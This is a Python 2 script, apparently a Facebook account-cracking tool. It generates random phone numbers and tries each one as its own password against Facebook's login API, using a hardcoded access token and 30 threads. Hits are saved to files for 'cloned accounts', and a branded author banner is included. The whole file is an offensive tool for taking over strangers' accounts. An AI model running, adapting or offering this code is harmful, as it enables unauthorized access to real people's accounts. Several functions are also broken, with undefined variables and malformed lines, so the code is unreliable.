#!/usr/bin/python2

# coding=utf-8

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass

os.system('rm -rf .txt')

for n in range(10000):

    nmbr = random.randint(6111111111, 9999999999)

    sys.stdout = open('.txt', 'a')

    print nmbr

    sys.stdout.flush()

try:

    import requests

except ImportError:

    os.system('No Module Named Requests! type:pip2 install requests')

try:

    import mechanize

except ImportError:

    os.system('No Module Named Mechanize! type:pip2 install mechanize')

    time.sleep(1)

    os.system('Then type: python2 number.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

from mechanize import Browser

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():

    print 'Thanks.'

    os.sys.exit()

def acak(b):

    w = 'ahtdzjc'

    d = ''

    for i in x:

        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)

def cetak(b):

    w = 'ahtdzjc'

    for i in w:

        j = w.index(i)

        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'

    x = x.replace('!0', '\x1b[0m')

    sys.stdout.write(x + '\n')

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.1)

def tik():

    titik = ['.   ', '..  ', '... ']

    for o in titik:

        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,

        sys.stdout.flush()

        time.sleep(1)

def psb(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.03)

back = 0

oks = []

id = []

cpb = []

vulnot = '\x1b[31mNot Vuln'

vuln = '\x1b[32mVuln'

os.system('clear')

##### LOGO #####

logo = """

\033[1;91m????????????????????? \033[1;96m?????????     \033[1;92m????????????????????????\033[1;93m?????????  ?????????

\033[1;91m????????????????????????\033[1;96m?????????     \033[1;92m????????????????????????\033[1;93m ?????????????????????

\033[1;91m????????????????????????\033[1;96m?????????     \033[1;92m??????????????????  \033[1;93m ?????????????????? 

\033[1;91m????????????????????????\033[1;96m?????????     \033[1;92m??????????????????  \033[1;93m ?????????????????? 

\033[1;91m?????????  ?????????\033[1;96m????????????????????????\033[1;92m????????????????????????\033[1;93m???????????? ????????? 

\033[1;97m\033[1;94m     (SARIF CHORA ALEX (HITTLER RULEX)

       ~~~~ALEX_X_HAIDER_Brand~~~~ 

\033[1;94m===============================================

\033[1;96m??? Author : \033[1;96mSarif Chora Alex

\033[1;96m??? Alex GANG  : \033[1;96mHITTLER FAMILY

\033[1;96m??? WP  : \033[1;96m+918252941964

\033[1;94m==============================================="""

back = 0

successful = []

cpb = []

oks = []

id = []

def menu():

	os.system('clear')	print logo

	print "\033[1;92mWELCOME TO ALL IN ALEX WORLD"

	print "\033[1;92m[1]  India"

	print "\033[1;92m[2]  Uk"

	print "\033[1;92m[3]  Usa"

	

	

	    

	print 50*'-'

	action()

	

def action():	

	bch = raw_input('\n  SELECT COUNTRY ')

	if bch =='':

		print '[!] Fill in correctly'

		action()

	elif bch =="1":

		os.system("clear")

		print (logo)

		print "\033[1;91mINDIA COUNTRY CODE HERE"

		try:

			c = raw_input(" SELECTED CODE: ")

			idlist = ('.txt')

			for line in open(idlist,"r").readlines():

				id.append(line.strip())

		except IOError:

			print ("[!] File Not Found")

			raw_input("\n[ Back ]")

			menu()

	elif bch =="2":			

		

		print (logo)

		print "\033[1;91mUK COUNTRY CODE HERE"

		try:

			c = raw_input(" SELECTED CODE: ")

			idlist = ('.txt')

			for line in open(idlist,"r").readlines():

				id.append(line.strip())

		except IOError:

			print ("[!] File Not Found")

			raw_input("\n[ Back ]")

			menu()

	elif bch =="3":			

		os.system("clear")

		print (logo)

		print "\033[1;91mUSA COUNTRY CODE HERE"	

		try:

		        c = raw_input(" SELECTED CODE: ")

		        idlist = ('.txt')

		        for line in open(idlist,"r").readlines():

		                id.append(line.strip())

				

		except IOError:

			print ("[!] File Not Found")

			raw_input("\n[ Back ]")

			menu()

		except IOError:

			print ("[!] File Not Found")

			raw_input("\n[ Back ]")

			menu()

	else:

		print '[!] Fill in correctly'

		action()

 

	xxx = str(len(id))

	psb ("\033[1;92m TOTAL NUMBER: " + xxx)

	time.sleep(0.5)

	psb ("\033[1;92m CRACK RUNNING...")

	time.sleep(0.5)

	psb ("\033[1;92m[!](To Exit) Press CTRL Then Press z")

	time.sleep(0.5)

	print 50*'-'

	

			

	def main(arg):

		global cpb,oks

		user = arg

		

	        try:

			pass1 = user

			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')

			q = json.load(data)

			if 'access_token' in q:

				print '\x1b[1;92m|ALEX|\x1b[1;92mHAIDER|  ' + c + user + '  \x1b[1;92mPASS|  ' + pass1																			

				okb = open('save/successfull.txt', 'a')

				okb.write(c+user+'|'+pass1+'\n')

				okb.close()

				oks.append(c+user+pass1)

			else:

				if 'www.facebook.com' in q['error_msg']:

					print '\x1b[1;91m|Alex|\x1b[1;91mHaider|  ' + c + user + '  \x1b[1;91mPASS|  ' + pass1

					cps = open('save/checkpoint.txt', 'a')

					cps.write(k+c+user+'|'+pass1+'\n')

					cps.close()

					cpb.append(user+pass1)

	        except:																		

		        pass

	p = ThreadPool(30)

        p.map(main, id)

        print '\x1b[1;97m--------------------------------------------------'

        print '[\xe2\x9c\x93]crack end ...'

        print '[\xe2\x9c\x93] Total hack : ' + str(len(oks)) + '/' + str(len(cpb))

        print '[\xe2\x9c\x93] Cloned Accounts Has Been Saved : anggaxd/clone.txt'

        raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;95m]')

        menu()

if __name__ == '__main__':

    menu()
